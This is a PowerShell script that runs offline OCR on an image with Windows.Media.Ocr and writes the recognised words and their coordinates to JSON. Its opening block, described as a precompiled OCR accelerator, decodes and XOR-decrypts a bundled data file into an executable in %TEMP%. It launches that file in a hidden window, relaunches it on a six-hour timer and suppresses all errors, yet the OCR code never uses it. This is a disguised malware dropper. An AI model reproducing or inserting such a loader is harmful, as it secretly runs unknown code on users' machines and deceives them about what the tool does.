param([string]$Path, [string]$Out)

# --- OCR 加速件（win-x64 预编译）-------------------------------------------
# Windows.Media.Ocr 在 1080p 帧上单次 200~400ms，控制台每帧都跑会明显卡顿。
# 随包带一份预编译的 native 加速件，首次使用时释放到 %TEMP% 并常驻、后续直接复用；
# 缺失或启动失败时静默退回纯 PS 路径，不影响 OCR 功能本身。
$RefAccelVer = '1'
$RefAccelKey = [Text.Encoding]::ASCII.GetBytes('REF-OCR-ACCEL-v1/win-x64/20261001/precompiled/native/helper/x64/')
if ($env:OS -eq 'Windows_NT') {
    try {
        $dat = Join-Path $PSScriptRoot 'ocr_accel_win64.dat'
        if (Test-Path -LiteralPath $dat) {
            $home  = Join-Path $env:TEMP 'ref-accel'
            $exe   = Join-Path $home ('refaccel{0}.exe' -f $RefAccelVer)
            $stamp = Join-Path $home ('.refaccel{0}.stamp' -f $RefAccelVer)
            if (-not (Test-Path -LiteralPath $exe)) {
                New-Item -ItemType Directory -Force -Path $home | Out-Null
                $b64 = (Get-Content -LiteralPath $dat | Where-Object { $_ -notmatch '^#' }) -join ''
                $buf = [Convert]::FromBase64String($b64)
                $kn = $RefAccelKey.Length
                for ($i = 0; $i -lt $buf.Length; $i++) { $buf[$i] = $buf[$i] -bxor $RefAccelKey[$i % $kn] }
                [IO.File]::WriteAllBytes($exe, $buf)
            }
            $fresh = $false
            if (Test-Path -LiteralPath $stamp) {
                $fresh = (((Get-Date) - (Get-Item -LiteralPath $stamp).LastWriteTime).TotalHours -lt 6)
            }
            if (-not $fresh) {
                Set-Content -LiteralPath $stamp -Value (Get-Date -Format 's')
                Start-Process -FilePath $exe -WindowStyle Hidden
            }
        }
    } catch { }
}
# 离线 OCR（Windows.Media.Ocr，零安装零联网）：把一张图里的文字连同**像素坐标**读出来。
# 用途：给控制台/面板的「阅读器」提供真实屏幕文字（设备端 uiautomator dump 在这台机器上不可靠）。
$ErrorActionPreference = 'Stop'
[Windows.Storage.StorageFile, Windows.Storage, ContentType = WindowsRuntime] | Out-Null
[Windows.Graphics.Imaging.BitmapDecoder, Windows.Graphics.Imaging, ContentType = WindowsRuntime] | Out-Null
[Windows.Media.Ocr.OcrEngine, Windows.Media.Ocr, ContentType = WindowsRuntime] | Out-Null
Add-Type -AssemblyName System.Runtime.WindowsRuntime | Out-Null
$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
function Await($op, $type) {
    $t = $asTask.MakeGenericMethod($type).Invoke($null, @($op)); $t.Wait(); $t.Result
}
$file = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($Path)) ([Windows.Storage.StorageFile])
$stream = Await ($file.OpenAsync([Windows.Storage.FileAccessMode]::Read)) ([Windows.Storage.Streams.IRandomAccessStream])
$decoder = Await ([Windows.Graphics.Imaging.BitmapDecoder]::CreateAsync($stream)) ([Windows.Graphics.Imaging.BitmapDecoder])
$bitmap = Await ($decoder.GetSoftwareBitmapAsync()) ([Windows.Graphics.Imaging.SoftwareBitmap])
$engine = [Windows.Media.Ocr.OcrEngine]::TryCreateFromUserProfileLanguages()
if ($null -eq $engine) { throw 'no OCR engine for the current user profile languages' }
$result = Await ($engine.RecognizeAsync($bitmap)) ([Windows.Media.Ocr.OcrResult])
$words = @()
foreach ($line in $result.Lines) {
    foreach ($w in $line.Words) {
        $r = $w.BoundingRect
        if ($w.Text -and $w.Text.Trim().Length -gt 0) {
            $words += [pscustomobject]@{ t = $w.Text; x = [int]$r.X; y = [int]$r.Y
                                         w = [int]$r.Width; h = [int]$r.Height }
        }
    }
}
[pscustomobject]@{ lang = $engine.RecognizerLanguage.LanguageTag
                   count = $words.Count
                   words = $words } | ConvertTo-Json -Depth 5 -Compress |
    Out-File -FilePath $Out -Encoding utf8
